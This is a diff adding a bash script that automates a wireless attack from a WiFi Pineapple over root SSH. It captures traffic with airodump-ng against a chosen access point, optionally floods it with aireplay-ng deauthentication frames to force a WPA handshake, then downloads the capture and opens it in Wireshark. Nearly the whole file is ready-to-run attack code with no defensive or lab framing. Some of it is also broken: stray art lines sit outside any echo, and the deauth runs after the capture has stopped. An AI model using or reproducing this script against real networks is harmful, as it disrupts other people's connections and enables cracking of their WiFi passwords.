@@ -1,0 +1,87 @@
+#!/bin/bash
+
+clear
+echo "⡱⢊⠴⣁⠎⡴⡘⢤⠣⡜⢢⠒⣷⡄⠆⢶⡀⠤⠑⠂⢶⡀⡐⡄⠰⡀⠄⢢⠐⢆
+⢧⢩⠒⡥⢚⡴⣉⠦⡓⡜⢢⢙⡾⡐⢌⡂⢿⡄⢁⠊⢴⠳⣔⢸⡀⢉⡗⣡⠫⢼
+⡎⢦⣙⢆⢇⡲⢡⢣⢇⣹⢅⣺⠇⢹⣆⠹⣌⢿⡄⢎⡸⡅⠈⢳⡜⣮⠝⣥⢋⢶
+⡙⠦⣝⢎⢮⡱⣋⢞⡴⣿⢪⣼⣃⣀⡹⣧⢻⡜⣿⣢⠱⣷⠤⠸⢷⣏⠞⣴⢫⣎
+⣭⢳⡹⣎⢶⣱⣋⢾⣼⠟⣧⣿⠀⠀⠀⠈⠳⣾⡹⣷⣣⢿⣆⡠⢀⢛⣿⡬⣷⢪
+⡮⢇⡿⣜⡳⢮⠵⣿⠏⢀⣼⣯⣤⣭⣓⠆⠀⠈⢻⣽⡧⣿⡷⣿⢿⣿⣾⣷⡹⣷
+⣟⡼⣚⣧⡻⣭⢿⡏⣾⡟⠋⣉⣻⣿⣿⠃⠀⠀⠀⣿⡽⠋⠀⣿⣿⣿⣏⡿⣷⣛
+⣿⠼⣭⢿⡵⣩⢾⡿⣏⠀⠀⢿⡿⣿⣿⠀⠀⠀⠸⠋⠁⠀⠀⠘⢾⣱⠏⠀⣿⣿
+⡟⠹⣮⡝⣿⣵⢊⢷⡈⠀⠀⠀⠙⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠠⠐⣿⣯
+⡄⢀⠙⢿⣜⣻⣿⡘⢷⣄⠀⠂⠄⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⡁⣩⡟⣿
+⣿⣤⣐⡈⠝⠉⡛⠿⠆⠀⠀⡁⠈⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣵⡗⠐
+⣗⢾⡹⣟⢿⣻⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠃⠀⠀⠀⠀⣴⣿⡷⠀
+⣿⣞⡽⣎⢷⣣⢿⣿⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⢟⡼⣻⣀
+⣿⣻⣼⡹⣞⡵⣫⣿⡿⣽⣿⣿⠳⠶⢤⣤⣀⣀⡀⠀⠀⣀⣴⣾⣿⡹⣞⡽⣹⣯
+⣟⡷⣯⠵⣫⠞⡵⣿⡿⣽⡾⣿⠠⠌⡐⠠⢂⡉⡙⠛⣻⣿⣿⣻⠖⡝⢮⡳⢭⡗"⠀⠀⠀⠀⠀⠀⠀⠀⠀
+echo "AUTOMATED WIFI-PINEAPPLE SCRIPT BY NAS3DO"
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+# === Config ===
+PINEAPPLE_IP="172.16.42.1"
+PINEAPPLE_USER="root"
+INTERFACE="wlan1mon"
+DURATION=60
+REMOTE_FILE="/tmp/capture-01.cap"
+LOCAL_FILE="$HOME/Desktop/capture_$(date +%F_%H-%M-%S).cap"
+
+# === Ask for Password ===
+read -s -p "Enter SSH password for $PINEAPPLE_USER@$PINEAPPLE_IP: " PINEAPPLE_PASS
+echo ""
+
+# === Optional Target Info ===
+read -p "Enter target BSSID (leave blank to scan all): " TARGET_BSSID
+read -p "Enter channel (leave blank for full spectrum scan): " CHANNEL
+
+# === Deauth Option ===
+read -p "Do you want to attempt a deauth attack to force a handshake? (y/N): " DEAUTH_CONFIRM
+DEAUTH_CONFIRM=${DEAUTH_CONFIRM,,}  # convert to lowercase
+
+# === SSH Command Builder ===
+BUILD_CAPTURE_COMMAND="airodump-ng"
+if [[ -n "$TARGET_BSSID" && -n "$CHANNEL" ]]; then
+    BUILD_CAPTURE_COMMAND+=" --bssid $TARGET_BSSID --channel $CHANNEL"
+fi
+BUILD_CAPTURE_COMMAND+=" --write /tmp/capture --output-format cap $INTERFACE"
+
+# === Execute on Pineapple ===
+echo -e "\n[*] Starting capture on Pineapple for $DURATION seconds..."
+
+ssh -tt "$PINEAPPLE_USER@$PINEAPPLE_IP" <<EOF
+killall airodump-ng 2>/dev/null
+rm -f /tmp/capture*.cap
+$BUILD_CAPTURE_COMMAND &
+sleep $DURATION
+killall airodump-ng
+EOF
+
+# === Optional Deauth ===
+if [[ "$DEAUTH_CONFIRM" == "y" && -n "$TARGET_BSSID" ]]; then
+    echo -e "\n[*] Sending deauth frames to stimulate a handshake..."
+    ssh -tt "$PINEAPPLE_USER@$PINEAPPLE_IP" <<EOF
+aireplay-ng --deauth 10 -a $TARGET_BSSID $INTERFACE
+EOF
+fi
+
+# === SCP Capture File ===
+echo -e "\n[*] Downloading capture file from Pineapple..."
+scp "$PINEAPPLE_USER@$PINEAPPLE_IP:/tmp/capture-01.cap" "$LOCAL_FILE"
+
+# === Open in Wireshark ===
+if [[ -f "$LOCAL_FILE" ]]; then
+    echo "[*] Opening in Wireshark..."
+    wireshark "$LOCAL_FILE" &
+    echo "[✓] Done. Check Wireshark for captured data."
+else
+    echo "[!] Capture file not found or download failed."
+    exit 1
+fi
